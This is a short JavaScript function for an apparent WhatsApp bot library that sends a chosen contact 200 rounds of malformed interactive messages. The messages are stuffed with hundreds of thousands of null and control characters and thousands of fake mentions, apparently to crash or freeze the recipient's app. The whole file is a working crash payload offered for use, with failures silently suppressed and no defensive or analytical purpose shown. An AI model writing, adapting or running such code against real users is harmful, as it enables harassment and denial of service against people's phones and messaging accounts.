async function NoEfek(sock, jid) {
  for (let i = 0; i < 200; i++) {
  const msg = {
    interactiveResponseMessage: {
      header: {
        title: "Calm ~ Rans" + "\u0000".repeat(9999) 
      },
      body: {
        text: "RanzX7", 
        formar: "EXTENSION_1"
      },
      nativeFlowResponseMessage: {
        name: "review_and_pay",
        paramsJson: "\u0000".repeat(2000)
      },
      version: 3,
      entryPointConversionSource: "payment_method"
    }, 
    quotedMessage: {
        viewOnceMessage: {
           message: {
              interactiveResponseMessage: {
                body: {
                  text: "𝖷𝟩Rans",
                  format: "EXTENSION_1" 
                },
                nativeFlowResponseMessage: {
                  name: "call_permission_request",
                  paramsJson: "\u0007".repeat(90000),
                  version: 3
                  }
              }
           }
        }
    }
  };

  const RX7Msg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            participant: jid,
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')
            ],
            body: {
              text: 'RansX7',
              format: 'EXTENSION_1'
            },
            footer: {
              text: '\u0000'.repeat(25000),
              format: 'EXTENSION_1'
            },
            nativeFlowResponseMessage: {
              name: 'address_message',
              paramsJson: `{"flow_cta":{"title":${"\u0000".repeat(990000)}}}`,
              version: 3
            }
          }
        }
      }
    }
  };


    await sock.relayMessage(jid, msg, {}).catch(() => {});
    await sock.relayMessage(jid, RX7Msg, { participant: { jid: jid } }).catch(() => {});
  }
}

try {
  await NoEfek(sock, jid);
} catch {}
